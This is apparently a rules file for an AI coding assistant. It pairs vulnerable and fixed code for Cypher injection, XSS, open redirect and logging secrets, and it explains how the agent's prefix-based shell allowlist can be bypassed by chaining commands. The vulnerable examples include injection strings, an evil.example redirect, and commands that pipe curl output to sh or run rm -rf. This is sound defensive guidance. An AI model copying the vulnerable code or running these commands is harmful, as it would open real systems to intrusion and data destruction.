---
description: "Before/after code pairs for the highest-risk security patterns in this repo's FastAPI, psycopg2/AGE, and React stack."
scope: portable
alwaysApply: true
---

## Production examples

Before/after pairs for the highest-risk security patterns. These load alongside `production-standards.md` when working in System 3 code. The "wrong" versions are not strawmen. They are what an LLM produces by default.

### 1. Cypher/SQL injection in the cypher_query tool

User request: "Query the graph for a gene by symbol"

Wrong:

```python
def get_gene_by_symbol(cursor, symbol):
    cursor.execute(f"SELECT * FROM cypher('kg', $$ MATCH (g:Gene {{symbol: '{symbol}'}}) RETURN g $$) AS (gene agtype)")
    return cursor.fetchone()
```

Problems:
- f-string interpolated straight into the Cypher payload inside the wrapping SQL. An attacker passing `' OR TRUE RETURN g UNION MATCH (u:User) RETURN u --` as symbol can escape the intended pattern.
- This is the same injection class as SQL built with an f-string. The AGE graph is queried over psycopg2, so it inherits every SQL injection risk plus a second Cypher-level injection surface inside the quoted payload.
- A SAST tool flags this as SQL/query injection (Critical). Blocks deploy.

Correct:

```python
def get_gene_by_symbol(cursor, symbol):
    cursor.execute(
        "SELECT * FROM cypher('kg', $$ MATCH (g:Gene {symbol: $symbol}) RETURN g $$, %s) AS (gene agtype)",
        (json.dumps({"symbol": symbol}),)
    )
    return cursor.fetchone()
```

Every value that reaches the Cypher payload goes through a parameter, never through string formatting of the Cypher text itself. If the AGE driver in use does not support named Cypher parameters, pass the value only through the outer psycopg2 `%s` placeholder and never build the inner Cypher string with the raw value.

### 2. Output escaping and XSS

User request: "Return a plain text response with the search query"

Wrong:

```python
@app.get("/echo")
def search_echo(q: str = ""):
    html = f"<div>You searched for: {q}</div>"
    return HTMLResponse(html)
```

Problems:
- User input built directly into an HTML string. An attacker passing `<script>alert(1)</script>` as `q` gets script execution.
- Hand-building HTML by string concatenation is exactly what the framework's response models exist to prevent. A SAST tool flags this as reflected XSS (High). Blocks deploy.

Correct:

```python
class EchoResponse(BaseModel):
    query: str

@app.get("/echo", response_model=EchoResponse)
def search_echo(q: str = ""):
    return EchoResponse(query=q)
```

Return data through a Pydantic response model and let FastAPI serialize it to JSON. Do not build HTML by string concatenation in a response at all; if a response genuinely needs markup, render it client-side from the JSON payload.

React note: JSX escapes interpolated values by default, so `<div>{query}</div>` in a component is already safe. `dangerouslySetInnerHTML` is the one place that default escaping is turned off, the same shape of risk as any template engine's raw-output mode. Never pass agent-generated or API-fetched content through `dangerouslySetInnerHTML` unless it has been through a sanitizer first.

### 3. URL parameter encoding and open redirect

User request: "Build a redirect to an external record page from a citation URL"

Wrong:

```python
def build_redirect(target: str):
    return RedirectResponse(url=target)
```

Problems:
- No validation that `target` points to an allowed host. An attacker passes `target=https://evil.example/phishing` and the app redirects there.
- No URL encoding applied if `target` is being composed from separate parameters rather than passed whole.
- A SAST tool flags this as open redirect (Medium to High depending on context).

Correct:

```python
import urllib.parse

ALLOWED_HOSTS = {"ncbi.nlm.nih.gov", "www.ncbi.nlm.nih.gov", "pubmed.ncbi.nlm.nih.gov"}

def build_redirect(target: str):
    parsed = urllib.parse.urlparse(target)
    if parsed.scheme != "https" or parsed.hostname not in ALLOWED_HOSTS:
        raise HTTPException(status_code=400, detail="Invalid redirect target")
    return RedirectResponse(url=target)
```

The same check belongs on the frontend wherever a link or redirect target is built from a citation `source_url` or a query parameter, not just on the backend:

```javascript
function safeRedirect(target) {
    try {
        const parsed = new URL(target, window.location.origin);
        if (ALLOWED_HOSTS.has(parsed.hostname)) {
            window.location.href = encodeURI(parsed.href);
        } else {
            window.location.href = "/";
        }
    } catch {
        window.location.href = "/";
    }
}
```

A redirect or link target must be validated against an allowed host before use, on whichever side of the stack constructs it.

### 4. Secrets in log messages

User request: "Add logging when the API call fails"

Wrong:

```python
def call_external_api(api_key, endpoint):
    try:
        response = requests.get(endpoint, headers={"Authorization": f"Bearer {api_key}"})
        response.raise_for_status()
    except requests.RequestException as e:
        logger.error(f"API call failed with key {api_key}: {e}")
        raise
```

Problems:
- The API key value is written to log output. Logs are stored, aggregated, and often accessible to a broader audience than the code that generated them.
- A SAST tool flags this as sensitive data exposure (High).

Correct:

```python
def call_external_api(api_key, endpoint):
    try:
        response = requests.get(endpoint, headers={"Authorization": f"Bearer {api_key}"})
        response.raise_for_status()
    except requests.RequestException as e:
        logger.error(f"API call to {endpoint} failed: {e}")
        raise
```

Log the key name as a string literal if it helps debugging ("NCBI_API_KEY missing or rejected"), never the value. This holds for every credential the agent handles: NCBI API keys, LLM provider keys, the AGE connection string.

### 5. Shell allowlist bypass via chained commands

User request: "Let the agent run git, python, and curl commands without prompting"

This repo's actual `.claude/settings.json` uses prefix-match allow rules:

```json
"permissions": {
  "allow": [
    "Bash(git:*)",
    "Bash(python:*)",
    "Bash(curl:*)"
  ]
}
```

Wrong assumption:
- "`Bash(git:*)` only lets the agent run git commands, so it's safe to auto-approve."

Problems:
- An allow rule matches the whole command string, not each segment. `Bash(git:*)` auto-approves `git status && rm -rf /` because the string starts with `git`. The destructive half rides in on the allowed half.
- The same is true of `Bash(curl:*)`: `curl https://example.com/x | sh` and `curl -o /tmp/x https://evil.example/payload && bash /tmp/x` both start with `curl` and both pass.
- Wrapping and chaining defeat a naive allowlist: `git status; curl evil.example/x | sh` and `python -c "import os; os.system('rm -rf ~')"` both pass their leading-token check.
- This is not hypothetical. It is how a shell allowlist that only lists the good command silently green-lights an arbitrary one.

Correct posture:
- Pair every narrow allow with explicit denies for the destructive commands and for chain operators, and confirm deny wins over allow. This repo's `PreToolUse` hooks (`.claude/hooks/block-bash-delete.sh`, `.claude/hooks/scan-secrets.sh`) are exactly this kind of pairing: an allow rule for a command family plus a hook that inspects the actual command string before it runs.
- Deny rules, and any custom hook that inspects commands, must be checked against every segment of a chained command (split on `&&`, `||`, `;`, `|`), and against the whole string. A narrow allow is only safe when paired with denies or hooks that catch chaining and the specific destructive commands, not just the leading token.
- When you build or extend a gate yourself, split the command on chain operators and validate each segment against the allowlist. Reject the whole command if any segment fails.

The test: does my code pass user input directly to Cypher, SQL, HTTP responses, URLs, or log messages without sanitization, and does my shell allowlist or hook validate every chained segment rather than just the leading command?
